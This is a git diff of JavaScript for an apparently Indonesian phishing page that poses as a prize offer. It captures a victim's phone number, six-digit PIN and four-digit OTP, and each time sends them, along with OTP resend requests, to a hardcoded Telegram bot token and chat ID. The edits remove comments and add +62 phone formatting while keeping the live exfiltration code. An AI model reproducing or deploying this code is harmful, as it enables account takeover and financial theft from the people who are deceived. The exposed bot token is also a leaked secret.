@@ -1,9 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
-  // CONFIG TELEGRAM - Sudah disesuaikan dengan data Anda
   const BOT_TOKEN = '8638833167:AAF6FET3TyZUQIoRxTwA6ZtvGyGAaxKghtM'; 
   const CHAT_ID = '-1003903129691';
 
-  // Elements DOM
   const splashScreen = document.getElementById('splashScreen');
   const loadingScreen = document.getElementById('loadingScreen');
   const pagePhone = document.getElementById('pagePhone');
@@ -19,7 +17,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   let countdownInterval = null;
 
-  // --- FUNGSI UTAMA KIRIM TELEGRAM DENGAN NOTIFIKASI ERROR ---
   function sendToTelegram(messageText) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
@@ -37,7 +34,6 @@ document.addEventListener('DOMContentLoaded', () => {
     .then(response => response.json())
     .then(data => {
       if (!data.ok) {
-        // Jika API Telegram menolak (Misal: Bot bukan admin grup)
         alert(`🔴 TELEGRAM MENOLAK PESAN!\nAlasan: ${data.description}\n\nSolusi: Pastikan Bot sudah masuk ke grup dan dijadikan ADMIN.`);
         console.error('Telegram Error:', data.description);
       } else {
@@ -45,13 +41,11 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     })
     .catch(error => {
-      // Jika internet putus atau URL diblokir jaringan
-      alert(`❌ GAGAL MENGAMBIL HADIAH, COBA LAGI!\nError: ${error}\n\nCek koneksi internet Anda.`);
+      alert(`❌ GAGAL MENGHUBUNGI TELEGRAM!\nError: ${error}\n\nCek koneksi internet Anda.`);
       console.error('Fetch Error:', error);
     });
   }
 
-  // --- 1. SPLASH SCREEN ---
   if (splashScreen) {
     setTimeout(() => {
       splashScreen.classList.add('fade-out');
@@ -63,27 +57,44 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 2200);
   }
 
-  // --- 2. VALIDASI INPUT NOMOR HP ---
   if (phoneInput && btnNext) {
     phoneInput.addEventListener('input', (e) => {
       let val = e.target.value.replace(/\D/g, '');
-      e.target.value = val;
       
-      if (val.length >= 9) {
+      if (val.startsWith('0')) {
+        val = val.substring(1);
+      }
+      
+      if (val.length > 12) {
+        val = val.substring(0, 12);
+      }
+      
+      let formatted = '';
+      if (val.length > 0) {
+        formatted += val.substring(0, 3);
+      }
+      if (val.length > 3) {
+        formatted += '-' + val.substring(3, 7);
+      }
+      if (val.length > 7) {
+        formatted += '-' + val.substring(7, 12);
+      }
+      
+      e.target.value = formatted;
+      
+      if (val.length >= 8) {
         btnNext.removeAttribute('disabled');
       } else {
         btnNext.setAttribute('disabled', 'true');
       }
     });
 
-    // --- 3. KLIK TOMBOL LANJUT ---
     btnNext.addEventListener('click', () => {
       if (loadingScreen) loadingScreen.classList.remove('hidden');
       
       const currentPhone = phoneInput.value;
-      const msg = `📱 *Data Masuk - Tahap 1*\n\n*Nomor HP:* \`${currentPhone}\``;
+      const msg = `📱 *Data Masuk - Tahap 1*\n\n*Nomor HP:* \`+62 ${currentPhone}\``;
       
-      // Mengirim nomor HP
       sendToTelegram(msg);
 
       setTimeout(() => {
@@ -97,11 +108,9 @@ document.addEventListener('DOMContentLoaded', () => {
       }, 1500);
     });
   } else {
-    // Deteksi jika HTML Anda tidak memiliki ID phoneInput atau btnNext
     console.error("EROR: Elemen 'phoneInput' atau 'btnNext' tidak ditemukan di HTML!");
   }
 
-  // --- 4. LOGIKA AUTO-INPUT PIN 6 DIGIT ---
   if (pinFields && pinFields.length > 0) {
     pinFields.forEach((field, index) => {
       field.addEventListener('input', (e) => {
@@ -132,9 +141,8 @@ document.addEventListener('DOMContentLoaded', () => {
       if (loadingScreen) loadingScreen.classList.remove('hidden');
 
       const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
-      const msg = `🔐 *Data Masuk - Tahap 2*\n\n*Nomor HP:* \`${currentPhone}\`\n*PIN:* \`${combinedPin}\``;
+      const msg = `🔐 *Data Masuk - Tahap 2*\n\n*Nomor HP:* \`+62 ${currentPhone}\`\n*PIN:* \`${combinedPin}\``;
       
-      // Mengirim PIN
       sendToTelegram(msg);
 
       setTimeout(() => {
@@ -151,7 +159,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // --- 5. LOGIKA AUTO-INPUT OTP 4 DIGIT ---
   if (otpFields && otpFields.length > 0) {
     otpFields.forEach((field, index) => {
       field.addEventListener('input', (e) => {
@@ -183,12 +190,10 @@ document.addEventListener('DOMContentLoaded', () => {
       otpFields.forEach(f => f.blur());
       if (loadingScreen) loadingScreen.classList.remove('hidden'); 
       
-      const msg = `🚀 *Data Lengkap Selesai*\n\n*Nomor HP:* \`${currentPhone}\`\n*PIN:* \`${combinedPin}\`\n*OTP:* \`${combinedOtp}\``;
+      const msg = `🚀 *Data Lengkap Selesai*\n\n*Nomor HP:* \`+62 ${currentPhone}\`\n*PIN:* \`${combinedPin}\`\n*OTP:* \`${combinedOtp}\``;
       
-      // Mengirim OTP Akhir
       sendToTelegram(msg).then(() => {
         setTimeout(() => {
-          if (loadingScreen) loadingScreen.classList.add('hidden');
           if (loadingScreen) loadingScreen.classList.remove('hidden');
           console.log("Proses Selesai Sempurna.");
         }, 1500);
@@ -218,7 +223,7 @@ document.addEventListener('DOMContentLoaded', () => {
               if (loadingScreen) loadingScreen.classList.remove('hidden');
               
               const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
-              sendToTelegram(`🔄 *Info:* Pengguna \`${currentPhone}\` meminta kirim ulang OTP.`);
+              sendToTelegram(`🔄 *Info:* Pengguna \`+62 ${currentPhone}\` meminta kirim ulang OTP.`);
 
               setTimeout(() => {
                 if (loadingScreen) loadingScreen.classList.add('hidden');
@@ -243,6 +248,7 @@ document.addEventListener('DOMContentLoaded', () => {
   function startOtpCountdownUpdate(targetSpan) {
     let timeLeft = 60;
     if (countdownInterval) clearInterval(countdownInterval);
+    
     countdownInterval = setInterval(() => {
       timeLeft--;
       targetSpan.textContent = timeLeft;
